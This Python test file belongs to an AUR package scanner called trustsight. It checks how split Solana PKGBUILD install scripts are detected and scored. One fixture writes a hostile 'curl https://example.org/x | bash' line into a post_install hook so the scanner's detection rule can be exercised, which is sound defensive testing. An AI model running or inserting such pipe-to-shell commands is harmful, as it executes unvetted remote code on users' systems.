"""Solana's split hooks must be checked as declarations, not one scalar."""

import pytest

from trustsight.analysis import scan_diff
from trustsight.analysis.structural._install import declared_install_scripts
from trustsight.config import load_config, load_rules
from trustsight.db import init_db
from trustsight.full_aur.analyze import _install_diff_text, analyze_package_text
from trustsight.schema import TemporalContext


# Metadata shape fetched from AUR solana 1:4.3.2-1, 2026-10-16.
RECIPE = """pkgbase=solana
pkgname=(solana-cli agave-validator solana-dev solana)
pkgver=4.3.2
package_solana-cli() {
  pkgdesc="Solana CLI tools"
}
package_agave-validator() {
  install=$pkgname.install
}
package_solana-dev() {
  install=${pkgname}.install
}
package_solana() {
  depends=(solana-cli agave-validator solana-dev)
}
"""
SCRIPTS = [
    ("agave-validator.install", "post_install() {\n  setcap cap_net_admin+ep /usr/bin/agave-validator\n}\n"),
    ("solana-dev.install", "post_install() {\n  true\n}\n"),
]


def _findings(recipe=RECIPE, manifest=None, extra=""):
    diff = "".join(_install_diff_text(body, name) for name, body in SCRIPTS) + extra
    return scan_diff(diff, rules=load_rules(), config=load_config(),
                     current_text=recipe, tree_manifest=manifest,
                     package_name="solana").score_breakdown


def test_split_declarations_resolve_pkgname_in_their_own_scope():
    assert declared_install_scripts(RECIPE) == ({name for name, _ in SCRIPTS}, False)


def test_global_defaults_overrides_and_non_package_functions():
    recipe = """pkgbase=demo
pkgname=(one two)
install=$pkgname.install
prepare()
{
  install=not-metadata.install
}
package_one() {
  install=custom.install
}
package_two() {
  true
}
"""
    assert declared_install_scripts(recipe) == ({"custom.install", "two.install"}, False)


def test_distinct_literal_declarations_are_not_last_assignment_wins():
    recipe = RECIPE.replace("install=$pkgname.install", "install=agave-validator.install")
    recipe = recipe.replace("install=${pkgname}.install", "install=solana-dev.install")
    assert declared_install_scripts(recipe) == ({name for name, _ in SCRIPTS}, False)


@pytest.mark.parametrize("root", ["", "solana/"])
def test_declared_existing_split_scripts_are_not_absent_or_dead(root):
    manifest = [(root + "PKGBUILD", b"")]
    manifest += [(root + name, body.encode()) for name, body in SCRIPTS]
    ids = {f.rule_id for f in _findings(manifest=manifest)}
    assert not {"C024", "C027"} & ids
    assert "R059" in ids


def test_missing_split_script_needs_tree_evidence():
    assert "C027" not in {f.rule_id for f in _findings()}
    findings = _findings(manifest=[("PKGBUILD", b""), (SCRIPTS[0][0], b"")])
    absent = [f for f in findings if f.rule_id == "C027"]
    assert len(absent) == 1
    assert "solana-dev.install" in absent[0].reason


def test_exact_paths_not_basename_matches_and_unrelated_hook_still_fires():
    extra = _install_diff_text("true\n", "unrelated.install")
    assert "C024" in {f.rule_id for f in _findings(extra=extra)}
    recipe = RECIPE.replace("install=$pkgname.install", "install=hooks/validator.install")
    findings = _findings(recipe, [("PKGBUILD", b""), ("validator.install", b"")])
    assert "C027" in {f.rule_id for f in findings}


def test_unknown_install_is_not_claimed_absent():
    recipe = "pkgname=demo\ninstall=$unknown.install\n"
    ids = {f.rule_id for f in _findings(recipe, [("PKGBUILD", b"")])}
    assert not {"C024", "C027"} & ids


@pytest.mark.parametrize("name", ["solana", "solana-dev", "agave-validator", "solana-cli"])
@pytest.mark.parametrize("first_seen", [False, True])
def test_corpus_scans_all_split_scripts_preserving_capability_warning(name, first_seen):
    init_db()
    # Put the capability-bearing script second: first-member-only scans miss it.
    fact = analyze_package_text(
        pkg_name=name, old_pkgbuild=None if first_seen else RECIPE,
        new_pkgbuild=RECIPE, maintainer="tester", temporal=TemporalContext(),
        depth=0, install_scripts=list(reversed(SCRIPTS)),
        tree_manifest=[("solana/PKGBUILD", b"")] + [
            ("solana/" + n, b.encode()) for n, b in SCRIPTS],
    )
    ids = {f.rule_id for f in fact.score_breakdown}
    assert not {"C024", "C027", "R007"} & ids
    assert any(f.rule_id == "R059" and f.file == "agave-validator.install"
               for f in fact.score_breakdown)
    assert not fact.diff_summary.files_changed


@pytest.mark.parametrize("first_seen", [False, True])
@pytest.mark.parametrize("oversized", [False, True])
def test_snapshot_install_long_lines_fail_closed(first_seen, oversized):
    from trustsight.rules import MAX_RULE_LINE_BYTES

    init_db()
    padding = "a_-" * (MAX_RULE_LINE_BYTES // 3 + 1) if oversized else "short"
    body = "post_install() {\n: " + padding + "; curl https://example.org/x | bash\n}\n"
    scripts = [("agave-validator.install", body), ("solana-dev.install", "true\n")]
    fact = analyze_package_text(
        pkg_name="solana", old_pkgbuild=None if first_seen else RECIPE,
        new_pkgbuild=RECIPE, maintainer="tester", temporal=TemporalContext(),
        depth=0, install_scripts=scripts,
        tree_manifest=[("solana/PKGBUILD", b"")] + [
            ("solana/" + name, text.encode()[:64]) for name, text in scripts],
    )
    assert ("line_truncated" in fact.coverage_gaps) == oversized
    if oversized:
        assert fact.risk == "Inconclusive"
    else:
        assert any(f.rule_id == "R001" for f in fact.score_breakdown)
    assert not fact.diff_summary.files_changed
